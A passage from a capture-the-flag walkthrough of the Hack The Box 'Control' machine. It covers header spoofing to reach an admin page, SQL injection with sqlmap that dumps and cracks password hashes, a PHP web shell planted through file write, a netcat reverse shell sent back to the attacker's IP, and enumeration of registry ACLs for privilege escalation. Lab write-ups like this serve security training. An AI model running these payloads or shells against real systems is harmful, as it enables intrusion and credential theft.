      if (price == 0 || price.includes("-")) {
         alert("Price must be greater than 0");
         return false;
      }
   } else if (form == "createCategory") {
      var name = document.forms["createCategory"]["name"].value;
      if (name.length &lt;= 0) {
         alert("Name cannot be empty!");
         return false;
      }
   } else if (form == "updateCategory") {
      var name = document.forms["updateCategory"]["name"].value;
      if (name.length &lt;= 0) {
         alert("Name cannot be empty!");
         return false;
      }
   }
   return true;
}
</code></pre>
<p>I tried fuzzing these pages and their parameters blindly with wfuzz but didn’t have any success in receiving interesting output from them.</p>
<p>Going back to the index of the web application a comment is found in the source code:</p>
<pre><code class="lang-auto">&lt;body class="is-preload landing"&gt;
	&lt;div id="page-wrapper"&gt;
		&lt;!-- To Do:
			- Import Products
			- Link to new payment system
			- Enable SSL (Certificates location \\192.168.4.28\myfiles)
		&lt;!-- Header --&gt;
</code></pre>
<p>We can deduce from this comment that the web server is supposed to trust an external server hosting SSL certificates, with the IP address of this server we can try injecting the custom proxy headers again using the IP above instead of 127.0.0.1:</p>
<pre><code class="lang-http">X-Originating-IP: 192.168.4.28
X-Forwarded-For: 192.168.4.28
X-Remote-IP: 192.168.4.28
X-Remote-Addr: 192.168.4.28
</code></pre>
<p>It can be very uncomfortable running every request through Burp to add the headers every time since as soon as we click another link on the application a request without the header will be generated, causing us to see the error again.</p>
<p>To solve this issue I used the <a href="https://github.com/mirfansulaiman/CustomHeader" rel="nofollow noopener">CustomHeaders</a> Burp extension to add the headers automatically to every request caught by the Burp proxy:</p>
<p><span alt="immagine" data-base62-sha1="3lY9T4tfBnjM1CjcvqFdK2kM2L" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>Adding all four headers with the correct IP address loads the admin page this time:</p>
<p><span alt="immagine" data-base62-sha1="lHTDCZsmWfy9TCQxtcpQ8ojt864" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>Going by exclusion it turns out the correct proxy header the web application checks for is this one:</p>
<pre><code class="lang-http">X-Forwarded-For: 192.168.4.28
</code></pre>
<p>Anyway now that we can finally see and use the Admin page we can observe how those PHP pages from earlier are utilized. New products can be created:</p>
<p><span alt="immagine" data-base62-sha1="zZ74i2PYGgfoLpALYjyLIqAJYL9" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>As well as new categories:</p>
<p><span alt="immagine" data-base62-sha1="3jJoTPSHYRc36WXNNwJBEZ47Kqo" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>After playing around with those functions I didn’t find them to be attackable, however SQL errors can be triggered by adding a single quote in the search field at the top of the page, so the search_products.php page appears to be vulnerable to SQL injection:</p>
<p><span alt="immagine" data-base62-sha1="1n6A1YzcmpzDxXR0uGdfft8Mtfu" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<hr>
<h2>Exploitation: SQL Injection (DB dump, file upload)</h2>
<p>We can use sqlmap to exploit the flaw and dump the passwords in the databases, making sure to add the proxy header to the requests for good measure:</p>
<pre><code class="lang-nohighlight">baud@kali:~/HTB/control$ sqlmap --passwords -u http://10.10.10.167/search_products.php --data='productName=name' --headers='X-Forwarded-For: 192.168.4.28'
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.2#stable}
|_ -| . ["]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:07:45 /2020-04-05/

[22:07:45] [INFO] resuming back-end DBMS 'mysql' 
[22:07:45] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: productName (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: productName=-3076' OR 6013=6013#

    Type: error-based
    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: productName=name' AND (SELECT 4131 FROM(SELECT COUNT(*),CONCAT(0x7178627071,(SELECT (ELT(4131=4131,1))),0x7176627871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- dzoa

    Type: stacked queries
    Title: MySQL &gt;= 5.0.12 stacked queries (comment)
    Payload: productName=name';SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
    Payload: productName=name' AND (SELECT 4951 FROM (SELECT(SLEEP(5)))YygG)-- NmJz

    Type: UNION query
    Title: MySQL UNION query (NULL) - 6 columns
    Payload: productName=name' UNION ALL SELECT NULL,CONCAT(0x7178627071,0x6a49496f58625764426b464f4c6f6f4d746c4556795965514d6442736f747a527778414d726c7a64,0x7176627871),NULL,NULL,NULL,NULL#
---
[22:07:45] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL &gt;= 5.0 (MariaDB fork)
[22:07:45] [INFO] fetching database users password hashes
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[22:07:49] [INFO] writing hashes to a temporary file '/tmp/sqlmap0n205v2b6830/sqlmaphashes-krexg5ga.txt' 
do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] n
database management system users password hashes:
[*] hector [1]:
    password hash: *0E178792E8FC304A2E3133D535D38CAF1DA3CD9D
[*] manager [1]:
    password hash: *CFE3EEE434B38CBF709AD67A4DCDEA476CBA7FDA
[*] root [1]:
    password hash: *0A4A5CAD344718DC418035A1F4D292BA603134D8

[22:07:51] [INFO] fetched data logged to text files under '/home/baud/.sqlmap/output/10.10.10.167'
[22:07:51] [WARNING] you haven't updated sqlmap for more than 64 days!!!

[*] ending @ 22:07:51 /2020-04-05/
</code></pre>
<p>The program was able to pull three different hashes as well as the usernames they belong to, two of those hashes are easily matched with cleartext passwords by <a href="https://crackstation.net/" rel="nofollow noopener">CrackStation</a> so we don’t even have to bruteforce anything:</p>
<p><span alt="immagine" data-base62-sha1="oKrCvGOelLYCIQgpGa3xjBYUzHK" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>This gives us two sets of possible credentials:</p>
<pre><code class="lang-nohighlight">User: hector
Pass: l33th4x0rhector

User: manager
Pass: l3tm3!n
</code></pre>
<p>The first thing I tried doing with the credentials is connecting to the MySQL server using the mysql client, however we are not authorized to access the server:</p>
<pre><code class="lang-nohighlight">baud@kali:~/HTB/control$ mysql -h 10.10.10.167 -u manager -p
Enter password: 
ERROR 1130 (HY000): Host '10.10.15.203' is not allowed to connect to this MariaDB server
</code></pre>
<p>So back to sqlmap, another possible way in is using the SQL injection vulnerability to upload arbitrary files on the server, like a simple PHP shell to execute shell commands. Here we’re going to have to guess the name of a directory we can write to, I went for the uploads folder found earlier and assumed it is located in the default IIS directory, C:\inetpub\wwwroot. Luckily the assumption was correct and the file was written on the server:</p>
<pre><code class="lang-nohighlight">baud@kali:~/HTB/control$ sqlmap -u http://10.10.10.167/search_products.php --data='productName=name' --headers='X-Forwarded-For: 192.168.4.28' --file-write=./baud.php --file-dest='C:\\inetpub\\wwwroot\\uploads\\baud3.php'
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.4.2#stable}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:27:43 /2020-04-06/

[17:27:43] [INFO] resuming back-end DBMS 'mysql' 
[17:27:43] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: productName (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: productName=-3076' OR 6013=6013#

    Type: error-based
    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: productName=name' AND (SELECT 4131 FROM(SELECT COUNT(*),CONCAT(0x7178627071,(SELECT (ELT(4131=4131,1))),0x7176627871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- dzoa

    Type: stacked queries
    Title: MySQL &gt;= 5.0.12 stacked queries (comment)
    Payload: productName=name';SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
    Payload: productName=name' AND (SELECT 4951 FROM (SELECT(SLEEP(5)))YygG)-- NmJz

    Type: UNION query
    Title: MySQL UNION query (NULL) - 6 columns
    Payload: productName=name' UNION ALL SELECT NULL,CONCAT(0x7178627071,0x6a49496f58625764426b464f4c6f6f4d746c4556795965514d6442736f747a527778414d726c7a64,0x7176627871),NULL,NULL,NULL,NULL#
---
[17:27:43] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL &gt;= 5.0 (MariaDB fork)
[17:27:43] [INFO] fingerprinting the back-end DBMS operating system
[17:27:43] [INFO] the back-end DBMS operating system is Windows
[17:27:44] [WARNING] potential permission problems detected ('Access denied')
[17:27:44] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)            
do you want confirmation that the local file 'baud.php' has been successfully written on the back-end DBMS file system ('C:/inetpub/wwwroot/uploads/baud3.php')? [Y/n] y
[17:27:47] [INFO] the local file 'baud.php' and the remote file 'C:/inetpub/wwwroot/uploads/baud3.php' have the same size (80 B)
[17:27:47] [INFO] fetched data logged to text files under '/home/baud/.sqlmap/output/10.10.10.167'
[17:27:47] [WARNING] you haven't updated sqlmap for more than 65 days!!!

[*] ending @ 17:27:47 /2020-04-06/
</code></pre>
<p>The shell is very simple and only has the purpose of giving me the ability to launch a different shell since I wasn’t able to execute OS commands from sqlmap itself using --os-cmd or --os-shell:</p>
<pre><code class="lang-auto">&lt;html&gt;
&lt;body&gt;
	&lt;pre&gt;
	&lt;?php
		system($_GET['cmd']);
	?&gt;
	&lt;/pre&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>The shell I want to launch makes use of <a href="https://eternallybored.org/misc/netcat/" rel="nofollow noopener">nc for Windows</a> so I uploaded the binary in the same folder as well:</p>
<pre><code class="lang-nohighlight">baud@kali:~/HTB/control$ sqlmap -u http://10.10.10.167/search_products.php --data='productName=name' --headers='X-Forwarded-For: 192.168.4.28' --file-write=./nc.exe --file-dest='C:\\inetpub\\wwwroot\\uploads\\nc.exe'
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.2#stable}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:24:01 /2020-04-06/

[23:24:01] [INFO] resuming back-end DBMS 'mysql' 
[23:24:01] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: productName (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: productName=-3076' OR 6013=6013#

    Type: error-based
    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: productName=name' AND (SELECT 4131 FROM(SELECT COUNT(*),CONCAT(0x7178627071,(SELECT (ELT(4131=4131,1))),0x7176627871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- dzoa

    Type: stacked queries
    Title: MySQL &gt;= 5.0.12 stacked queries (comment)
    Payload: productName=name';SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
    Payload: productName=name' AND (SELECT 4951 FROM (SELECT(SLEEP(5)))YygG)-- NmJz

    Type: UNION query
    Title: MySQL UNION query (NULL) - 6 columns
    Payload: productName=name' UNION ALL SELECT NULL,CONCAT(0x7178627071,0x6a49496f58625764426b464f4c6f6f4d746c4556795965514d6442736f747a527778414d726c7a64,0x7176627871),NULL,NULL,NULL,NULL#
---
[23:24:02] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL &gt;= 5.0 (MariaDB fork)
[23:24:02] [INFO] fingerprinting the back-end DBMS operating system
[23:24:02] [INFO] the back-end DBMS operating system is Windows
[23:24:02] [WARNING] potential permission problems detected ('Access denied')
[23:24:15] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)              
do you want confirmation that the local file 'nc.exe' has been successfully written on the back-end DBMS file system ('C:/inetpub/wwwroot/uploads/nc.exe')? [Y/n] y
[23:24:19] [INFO] the local file 'nc.exe' and the remote file 'C:/inetpub/wwwroot/uploads/nc.exe' have the same size (28160 B)
[23:24:19] [INFO] fetched data logged to text files under '/home/baud/.sqlmap/output/10.10.10.167'
[23:24:19] [WARNING] you haven't updated sqlmap for more than 65 days!!!

[*] ending @ 23:24:19 /2020-04-06/
</code></pre>
<p>Check if the web shell works as intended:</p>
<p><span alt="immagine" data-base62-sha1="nprtEHx2zDL7dY3onoSBdiZdHNA" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>Now with a single request to that page we can start a proper reverse shell using nc and we’re in:</p>
<pre><code class="lang-nohighlight">baud@kali:~/HTB/control$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.15.203] from (UNKNOWN) [10.10.10.167] 57762
Microsoft Windows [Version 10.0.17763.805]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\inetpub\wwwroot\uploads&gt;
</code></pre>
<hr>
<h2>Escalating to Hector and local enumeration</h2>
<p>As it turns out the Manager user does not exist, but Hector does have an account on the system:</p>
<pre><code class="lang-nohighlight">C:\inetpub\wwwroot\uploads&gt;dir c:\users
dir c:\users
 Volume in drive C has no label.
 Volume Serial Number is C05D-877F

 Directory of c:\users

11/05/2019  03:34 PM    &lt;DIR&gt;          .
11/05/2019  03:34 PM    &lt;DIR&gt;          ..
11/05/2019  03:34 PM    &lt;DIR&gt;          Administrator
11/01/2019  12:09 PM    &lt;DIR&gt;          Hector
10/21/2019  05:29 PM    &lt;DIR&gt;          Public
               0 File(s)              0 bytes
               5 Dir(s)  43,519,860,736 bytes free

C:\inetpub\wwwroot\uploads&gt;
</code></pre>
<p>Because we already have found Hector’s password we can switch to it with a <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_pssessions?view=powershell-7" rel="nofollow noopener">PSSession</a>:</p>
<pre><code class="lang-nohighlight">C:\inetpub\wwwroot\uploads&gt;powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\inetpub\wwwroot\uploads&gt; $pw = ConvertTo-SecureString -String "l33th4x0rhector" -AsPlainText -force
$pw = ConvertTo-SecureString -String "l33th4x0rhector" -AsPlainText -force
PS C:\inetpub\wwwroot\uploads&gt; $pp = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ".\Hector", $pw
$pp = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ".\Hector", $pw
PS C:\inetpub\wwwroot\uploads&gt; Enter-PSSession -ComputerName localhost -Credential $pp
Enter-PSSession -ComputerName localhost -Credential $pp
[localhost]: PS C:\Users\Hector\Documents&gt; whoami
whoami
control\hector
[localhost]: PS C:\Users\Hector\Documents&gt;
</code></pre>
<p>And then launch nc.exe again to have a more comfortable shell instead of the awkward <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command?view=powershell-7" rel="nofollow noopener">Invoke-Command</a> syntax:</p>
<pre><code class="lang-nohighlight">[localhost]: PS C:\Users\Hector\Documents&gt; Invoke-Command -ScriptBlock { C:\inetpub\wwwroot\uploads\nc.exe -e cmd.exe 10.10.15.203 9898 }
</code></pre>
<p><span alt="immagine" data-base62-sha1="CTvZYUNqsKb1KO6awhdPu2ts6t" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>Looking for interesting files, the only thing that sticks out is Hector’s’ PowerShell history located in AppData:</p>
<pre><code class="lang-nohighlight">C:\Users\Hector\AppData&gt;dir C:\Users\Hector\AppData\roaming\microsoft\windows\powershell\psreadline
dir C:\Users\Hector\AppData\roaming\microsoft\windows\powershell\psreadline
 Volume in drive C has no label.
 Volume Serial Number is C05D-877F

 Directory of C:\Users\Hector\AppData\roaming\microsoft\windows\powershell\psreadline

11/25/2019  12:04 PM    &lt;DIR&gt;          .
11/25/2019  12:04 PM    &lt;DIR&gt;          ..
11/25/2019  02:36 PM               114 ConsoleHost_history.txt
               1 File(s)            114 bytes
               2 Dir(s)  43,519,021,056 bytes free

C:\Users\Hector\AppData&gt;
</code></pre>
<p>It contains the following commands:</p>
<pre><code class="lang-nohighlight">C:\Users\Hector\AppData&gt;more C:\Users\Hector\AppData\roaming\microsoft\windows\powershell\psreadline\ConsoleHost_history.txt
more C:\Users\Hector\AppData\roaming\microsoft\windows\powershell\psreadline\ConsoleHost_history.txt
get-childitem HKLM:\SYSTEM\CurrentControlset | format-list
get-acl HKLM:\SYSTEM\CurrentControlSet | format-list

C:\Users\Hector\AppData&gt;
</code></pre>
<p>There are two commands that query the registry, replicating the first one returns this output:</p>
<pre><code class="lang-nohighlight">C:\Users\Hector\AppData&gt;powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Hector\AppData&gt; get-childitem HKLM:\SYSTEM\CurrentControlset | format-list
get-childitem HKLM:\SYSTEM\CurrentControlset | format-list


Property      : {BootDriverFlags, CurrentUser, EarlyStartServices, PreshutdownOrder...}
PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Control
PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
PSChildName   : Control
PSDrive       : HKLM
PSProvider    : Microsoft.PowerShell.Core\Registry
PSIsContainer : True
SubKeyCount   : 121
View          : Default
Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
ValueCount    : 11
Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Control

Property      : {NextParentID.daba3ff.2, NextParentID.61aaa01.3, NextParentID.1bd7f811.4, NextParentID.2032e665.5...}
PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Enum
PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
PSChildName   : Enum
PSDrive       : HKLM
PSProvider    : Microsoft.PowerShell.Core\Registry
PSIsContainer : True
SubKeyCount   : 17
View          : Default
Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
ValueCount    : 27
Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Enum

Property      : {}
PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Hardware Profiles
PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
PSChildName   : Hardware Profiles
PSDrive       : HKLM
PSProvider    : Microsoft.PowerShell.Core\Registry
PSIsContainer : True
SubKeyCount   : 3
View          : Default
Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
ValueCount    : 0
Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Hardware Profiles

Property      : {}
PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Policies
PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
PSChildName   : Policies
PSDrive       : HKLM
PSProvider    : Microsoft.PowerShell.Core\Registry
PSIsContainer : True
SubKeyCount   : 0
View          : Default
Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
ValueCount    : 0
Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Policies

Property      : {}
PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services
PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
PSChildName   : Services
PSDrive       : HKLM
PSProvider    : Microsoft.PowerShell.Core\Registry
PSIsContainer : True
SubKeyCount   : 667
View          : Default
Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
ValueCount    : 0
Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services

Property      : {}
PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Software
PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
PSChildName   : Software
PSDrive       : HKLM
PSProvider    : Microsoft.PowerShell.Core\Registry
PSIsContainer : True
SubKeyCount   : 1
View          : Default
Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
ValueCount    : 0
Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Software
</code></pre>
<p>This is just used to return all the child items of the CurrentControlSet registry location. The second command on the other hand shows the access control list of the same registry entry:</p>
<pre><code class="lang-nohighlight">PS C:\Users\Hector\AppData&gt; get-acl HKLM:\SYSTEM\CurrentControlSet | format-list
get-acl HKLM:\SYSTEM\CurrentControlSet | format-list


Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet
Owner  : BUILTIN\Administrators
Group  : NT AUTHORITY\SYSTEM
Access : BUILTIN\Administrators Allow  FullControl
         NT AUTHORITY\Authenticated Users Allow  ReadKey
         NT AUTHORITY\Authenticated Users Allow  -2147483648
         S-1-5-32-549 Allow  ReadKey
         S-1-5-32-549 Allow  -2147483648
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Administrators Allow  268435456
         NT AUTHORITY\SYSTEM Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  268435456
         CREATOR OWNER Allow  268435456
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -2147483648
         S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow  
         ReadKey
         S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow  
         -2147483648
Audit  : 
Sddl   : O:BAG:SYD:AI(A;;KA;;;BA)(A;ID;KR;;;AU)(A;CIIOID;GR;;;AU)(A;ID;KR;;;SO)(A;CIIOID;GR;;;SO)(A;ID;KA;;;BA)(A;CIIOI
         D;GA;;;BA)(A;ID;KA;;;SY)(A;CIIOID;GA;;;SY)(A;CIIOID;GA;;;CO)(A;ID;KR;;;AC)(A;CIIOID;GR;;;AC)(A;ID;KR;;;S-1-15-
         3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681)(A;CIIOID;GR;;;S
         -1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681)
</code></pre>
<p>While that output does not contain very interesting info it comes from a command we can re-use for further enumeration in the next phase, which is where the guess work bit begins.</p>
<hr>
<h2>Beginning of the guess work</h2>
<p>The box gave us a few hints, now it’s up to us to put all of them together and come up with an attack vector. Judging from his PowerShell history Hector was concerned with checking the ACL of the CurrentControlSet registry entries, so maybe, just maybe, some entries in there will have some interesting or non-standard permissions that we could take advantage of. This is our first assumption.</p>
<p>Arguably the most interesting entry within the CurrentControlSet child items is Services. All entries in the Services folder tell Windows how to manage the installed services, how to start them, when, with what privileges, and so on.</p>
<p>As we should already know, Windows services typically run under the <a href="https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account" rel="nofollow noopener">local SYSTEM</a> account unless they’ve been set to use a less privileged account, like the <a href="https://docs.microsoft.com/en-us/windows/win32/services/localservice-account" rel="nofollow noopener">local service</a> or the <a href="https://docs.microsoft.com/en-us/windows/win32/services/networkservice-account" rel="nofollow noopener">network service</a> accounts.</p>
<p>Because of the very high privileges under which a lot of services run they make for very interesting targets. So let’s start enumerating the services this installation of Windows has enabled, simply by listing the child entries of the Services directory in the registry:</p>
<pre><code class="lang-nohighlight">PS C:\Users\Hector\Documents&gt; reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services &gt; svcs.txt
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services &gt; svcs.txt
PS C:\Users\Hector\Documents&gt; dir
dir


    Directory: C:\Users\Hector\Documents


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----         4/6/2020   6:58 PM          45272 nc.exe                                                                
-a----         4/6/2020   7:02 PM             11 query                                                                 
-a----         4/6/2020   7:02 PM              0 Servicenames.txt                                                      
-a----         4/6/2020   7:03 PM          85894 svcs.txt                                                              


PS C:\Users\Hector\Documents&gt;
</code></pre>
<p>The output will look like this:</p>
<pre><code class="lang-nohighlight">[....]
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\netvscvfpp
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\NgcCtnrSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\NgcSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\NlaSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\Npfs
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\npsvctrig
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\nsi
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\nsiproxy
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\Ntfs
[....]
</code></pre>
<p>Transfer the output file locally using nc since we have it available, for easier analysis:</p>
<p><span alt="immagine" data-base62-sha1="fFlhHkqKr4yzLPQOAb8Z2iU9snI" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>With a list of the different service paths in the registry we can use the <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-acl?view=powershell-7" rel="nofollow noopener">Get-ACL</a> cmdlet that was also used by Hector to test a bunch of services for interesting permissions, I also pipe the output of the cmdlet to <em>fl</em>, which is an alias for <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/format-list?view=powershell-7" rel="nofollow noopener">Format List</a>, to avoid receiving a truncated output.</p>
<p>Of course this can be scripted very easily if you are not new to PowerShell, but because I suck at it I did it the manual way.</p>
<p>After trying out a few different services, you will eventually run into one that grants Hector full control access, like DeviceInstall:</p>
<pre><code class="lang-nohighlight">PS C:\Users\Hector\Documents&gt; get-acl HKLM:\SYSTEM\CurrentControlset\Services\DeviceInstall | fl
get-acl HKLM:\SYSTEM\CurrentControlset\Services\DeviceInstall | fl


Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\DeviceInstall
Owner  : NT AUTHORITY\SYSTEM
Group  : NT AUTHORITY\SYSTEM
Access : APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey
         NT AUTHORITY\SYSTEM Allow  FullControl
         CREATOR OWNER Allow  FullControl
         NT AUTHORITY\Authenticated Users Allow  ReadKey
         NT AUTHORITY\SYSTEM Allow  FullControl
         CONTROL\Hector Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
Audit  : 
Sddl   : O:SYG:SYD:AI(A;CIID;KR;;;AC)(A;ID;KA;;;SY)(A;CIIOID;KA;;;CO)(A;CIID;KR;;;AU)(A;CIIOID;KA;;;SY)(A;CIID;KA;;;S-1
         -5-21-3271572904-80546332-2170161114-1000)(A;CIID;KA;;;BA)
</code></pre>
<p>With those permissions DeviceInstall could make for an attackable service. Let’s query the registry for more information to see how a service entry looks like:</p>
<pre><code class="lang-nohighlight">PS C:\Users\Hector\Documents&gt; reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\DeviceInstall
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\DeviceInstall

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\DeviceInstall
    Description    REG_SZ    @%SystemRoot%\system32\umpnpmgr.dll,-101
    DisplayName    REG_SZ    @%SystemRoot%\system32\umpnpmgr.dll,-100
    ErrorControl    REG_DWORD    0x1
    FailureActions    REG_BINARY    100E0000000000000000000003000000140000000100000060EA000001000000C0D401000000000000000000
    FailureActionsOnNonCrashFailures    REG_DWORD    0x1
    Group    REG_SZ    PlugPlay
    ImagePath    REG_EXPAND_SZ    %SystemRoot%\system32\svchost.exe -k DcomLaunch -p
    ObjectName    REG_SZ    LocalSystem
    PreshutdownTimeout    REG_DWORD    0x36ee80
